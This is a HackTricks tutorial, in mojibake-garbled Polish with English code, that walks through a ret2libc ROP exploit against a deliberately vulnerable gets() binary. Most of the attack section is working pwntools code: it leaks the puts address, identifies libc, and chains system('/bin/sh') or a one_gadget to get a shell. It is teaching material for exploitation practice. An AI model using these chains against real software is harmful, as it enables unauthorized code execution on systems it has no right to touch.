# Leaking libc address with ROP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Quick Resume

1. **ZnajdÅº** offset **przepeÅ‚nienia**
2. **ZnajdÅº** gadget `POP_RDI`, `PUTS_PLT` i `MAIN`
3. UÅ¼yj poprzednich gadgetÃ³w, aby **wyciekowaÄ‡ adres pamiÄ™ci** puts lub innej funkcji libc i **znaleÅºÄ‡ wersjÄ™ libc** ([pobierz jÄ…](https://libc.blukat.me))
4. Z bibliotekÄ…, **oblicz ROP i wykorzystaj to**

## Other tutorials and binaries to practice

This tutorial is going to exploit the code/binary proposed in this tutorial: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
Another useful tutorials: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## Code

Filename: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - Leaking LIBC template

Zamierzam uÅ¼yÄ‡ kodu znajdujÄ…cego siÄ™ tutaj, aby stworzyÄ‡ exploit.\
Pobierz exploit i umieÅ›Ä‡ go w tym samym katalogu co podatny binarny plik i podaj potrzebne dane do skryptu:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- Znalezienie offsetu

Szablon potrzebuje offsetu przed kontynuowaniem exploitacji. JeÅ›li jakikolwiek zostanie podany, wykona niezbÄ™dny kod, aby go znaleÅºÄ‡ (domyÅ›lnie `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**Wykonaj** `python template.py`, a konsola **GDB** zostanie otwarta z programem, ktÃ³ry ulegÅ‚ awarii. WewnÄ…trz tej **konsoli GDB** wykonaj `x/wx $rsp`, aby uzyskaÄ‡ **bajty**, ktÃ³re miaÅ‚y nadpisaÄ‡ RIP. Na koniec uzyskaj **offset** uÅ¼ywajÄ…c konsoli **python**:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../../.gitbook/assets/image (140).png>)

Po znalezieniu offsetu (w tym przypadku 40) zmieÅ„ zmiennÄ… OFFSET w szablonie, uÅ¼ywajÄ…c tej wartoÅ›ci.\
`OFFSET = "A" * 40`

Innym sposobem byÅ‚oby uÅ¼ycie: `pattern create 1000` -- _wykonaj do ret_ -- `pattern seach $rsp` z GEF.

## 2- Znajdowanie GadÅ¼etÃ³w

Teraz musimy znaleÅºÄ‡ gadÅ¼ety ROP w binarnym pliku. Te gadÅ¼ety ROP bÄ™dÄ… przydatne do wywoÅ‚ania `puts`, aby znaleÅºÄ‡ uÅ¼ywanÄ… **libc**, a pÃ³Åºniej do **uruchomienia ostatecznego exploit**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT` jest potrzebny do wywoÅ‚ania **funkcji puts**.\
`MAIN_PLT` jest potrzebny do ponownego wywoÅ‚ania **funkcji main** po jednej interakcji, aby **wykorzystaÄ‡** przepeÅ‚nienie **ponownie** (nieskoÅ„czone rundy eksploatacji). **Jest uÅ¼ywany na koÅ„cu kaÅ¼dego ROP, aby ponownie wywoÅ‚aÄ‡ program**.\
**POP\_RDI** jest potrzebny do **przekazania** **parametru** do wywoÅ‚ywanej funkcji.

W tym kroku nie musisz nic wykonywaÄ‡, poniewaÅ¼ wszystko zostanie znalezione przez pwntools podczas wykonania.

## 3- Znalezienie biblioteki libc

Teraz czas, aby znaleÅºÄ‡, ktÃ³ra wersja biblioteki **libc** jest uÅ¼ywana. Aby to zrobiÄ‡, zamierzamy **wyciek** **adresu** w pamiÄ™ci funkcji `puts`, a nastÄ™pnie zamierzamy **przeszukaÄ‡**, w ktÃ³rej **wersji biblioteki** znajduje siÄ™ wersja puts w tym adresie.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
Aby to zrobiÄ‡, najwaÅ¼niejsza linia wykonanego kodu to:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
To wyÅ›le kilka bajtÃ³w, aÅ¼ **nadpisanie** **RIP** bÄ™dzie moÅ¼liwe: `OFFSET`.\
NastÄ™pnie ustawi **adres** gadÅ¼etu `POP_RDI`, aby nastÄ™pny adres (`FUNC_GOT`) zostaÅ‚ zapisany w rejestrze **RDI**. Dzieje siÄ™ tak, poniewaÅ¼ chcemy **wywoÅ‚aÄ‡ puts**, **przekazujÄ…c** mu **adres** `PUTS_GOT`, poniewaÅ¼ adres w pamiÄ™ci funkcji puts jest zapisany w adresie wskazywanym przez `PUTS_GOT`.\
Po tym zostanie wywoÅ‚ane `PUTS_PLT` (z `PUTS_GOT` wewnÄ…trz **RDI**), aby puts **odczytaÅ‚ zawartoÅ›Ä‡** wewnÄ…trz `PUTS_GOT` (**adres funkcji puts w pamiÄ™ci**) i **wydrukowaÅ‚ go**.\
Na koniec **funkcja main jest wywoÅ‚ywana ponownie**, abyÅ›my mogli ponownie wykorzystaÄ‡ przepeÅ‚nienie.

W ten sposÃ³b **oszukaliÅ›my funkcjÄ™ puts**, aby **wydrukowaÅ‚a** **adres** w **pamiÄ™ci** funkcji **puts** (ktÃ³ra znajduje siÄ™ w bibliotece **libc**). Teraz, gdy mamy ten adres, moÅ¼emy **sprawdziÄ‡, ktÃ³ra wersja libc jest uÅ¼ywana**.

![](<../../../../../.gitbook/assets/image (141).png>)

PoniewaÅ¼ **eksploatujemy** lokalny binarny plik, **nie ma potrzeby** ustalania, ktÃ³ra wersja **libc** jest uÅ¼ywana (po prostu znajdÅº bibliotekÄ™ w `/lib/x86_64-linux-gnu/libc.so.6`).\
Jednak w przypadku zdalnego eksploatu to wyjaÅ›niÄ™, jak moÅ¼esz to znaleÅºÄ‡:

### 3.1- Szukanie wersji libc (1)

MoÅ¼esz sprawdziÄ‡, ktÃ³ra biblioteka jest uÅ¼ywana na stronie internetowej: [https://libc.blukat.me/](https://libc.blukat.me)\
Pozwoli to rÃ³wnieÅ¼ pobraÄ‡ odkrytÄ… wersjÄ™ **libc**.

![](<../../../../../.gitbook/assets/image (142).png>)

### 3.2- Szukanie wersji libc (2)

MoÅ¼esz rÃ³wnieÅ¼ zrobiÄ‡:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

To zajmie trochÄ™ czasu, bÄ…dÅº cierpliwy.\
Aby to zadziaÅ‚aÅ‚o, potrzebujemy:

* Nazwa symbolu libc: `puts`
* Wyciekniony adres libc: `0x7ff629878690`

MoÅ¼emy ustaliÄ‡, ktÃ³ra **libc** jest najprawdopodobniej uÅ¼ywana.
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Otrzymujemy 2 dopasowania (powinieneÅ› sprÃ³bowaÄ‡ drugiego, jeÅ›li pierwsze nie dziaÅ‚a). Pobierz pierwsze:
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
Skopiuj libc z `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` do naszego katalogu roboczego.

### 3.3- Inne funkcje do wycieku
```python
puts
printf
__libc_start_main
read
gets
```
## 4- Znalezienie adresu libc i wykorzystanie

Na tym etapie powinniÅ›my znaÄ‡ uÅ¼ywanÄ… bibliotekÄ™ libc. PoniewaÅ¼ wykorzystujemy lokalny binarny plik, uÅ¼yjÄ™ tylko: `/lib/x86_64-linux-gnu/libc.so.6`

Na poczÄ…tku `template.py` zmieÅ„ zmiennÄ… **libc** na: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Ustaw Å›cieÅ¼kÄ™ do biblioteki, gdy jÄ… znamy`

PodajÄ…c **Å›cieÅ¼kÄ™** do **biblioteki libc**, reszta **eksploitu zostanie automatycznie obliczona**.

WewnÄ…trz funkcji `get_addr` zostanie obliczony **adres bazowy libc**:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
ZauwaÅ¼, Å¼e **ostateczny adres bazy libc musi koÅ„czyÄ‡ siÄ™ na 00**. JeÅ›li tak nie jest, mogÅ‚eÅ› wyciekowaÄ‡ niepoprawnÄ… bibliotekÄ™.
{% endhint %}

NastÄ™pnie adres do funkcji `system` oraz **adres** do ciÄ…gu _"/bin/sh"_ bÄ™dÄ… **obliczane** na podstawie **adresu bazy** **libc** i podanej **biblioteki libc.**
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Na koniec przygotowywany jest exploit do wykonania /bin/sh:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Let's explain this final ROP.\
Ostatni ROP (`rop1`) zakoÅ„czyÅ‚ siÄ™ ponownym wywoÅ‚aniem funkcji main, wiÄ™c moÅ¼emy **ponownie wykorzystaÄ‡** **przepeÅ‚nienie** (dlatego `OFFSET` jest tutaj znowu). NastÄ™pnie chcemy wywoÅ‚aÄ‡ `POP_RDI`, wskazujÄ…c na **adres** _"/bin/sh"_ (`BINSH`) i wywoÅ‚aÄ‡ funkcjÄ™ **system** (`SYSTEM`), poniewaÅ¼ adres _"/bin/sh"_ zostanie przekazany jako parametr.\
Na koniec **adres funkcji exit** jest **wywoÅ‚ywany**, aby proces **Å‚adnie zakoÅ„czyÅ‚ dziaÅ‚anie** i nie wygenerowaÅ‚ Å¼adnego alertu.

**W ten sposÃ³b exploit uruchomi \_/bin/sh**\_\*\* shell.\*\*

![](<../../../../../.gitbook/assets/image (143).png>)

## 4(2)- Using ONE\_GADGET

MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget), aby uzyskaÄ‡ shell zamiast uÅ¼ywaÄ‡ **system** i **"/bin/sh". ONE\_GADGET** znajdzie w bibliotece libc sposÃ³b na uzyskanie shell'a, uÅ¼ywajÄ…c tylko jednego **adresu ROP**.\
Jednak zazwyczaj istniejÄ… pewne ograniczenia, najczÄ™stsze i Å‚atwe do ominiÄ™cia to `[rsp+0x30] == NULL`. PoniewaÅ¼ kontrolujesz wartoÅ›ci wewnÄ…trz **RSP**, musisz tylko wysÅ‚aÄ‡ kilka dodatkowych wartoÅ›ci NULL, aby ograniczenie zostaÅ‚o ominiÄ™te.

![](<../../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## EXPLOIT FILE

MoÅ¼esz znaleÅºÄ‡ szablon do wykorzystania tej podatnoÅ›ci tutaj:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## Common problems

### MAIN\_PLT = elf.symbols\['main'] not found

JeÅ›li symbol "main" nie istnieje. Wtedy moÅ¼esz znaleÅºÄ‡, gdzie znajduje siÄ™ gÅ‚Ã³wny kod:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
i ustaw adres rÄ™cznie:
```python
MAIN_PLT = 0x401080
```
### Puts nie znaleziono

JeÅ›li binarny plik nie uÅ¼ywa Puts, powinieneÅ› sprawdziÄ‡, czy uÅ¼ywa

### `sh: 1: %s%s%s%s%s%s%s%s: nie znaleziono`

JeÅ›li znajdziesz ten **bÅ‚Ä…d** po stworzeniu **wszystkich** exploitÃ³w: `sh: 1: %s%s%s%s%s%s%s%s: nie znaleziono`

SprÃ³buj **odjÄ…Ä‡ 64 bajty od adresu "/bin/sh"**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}
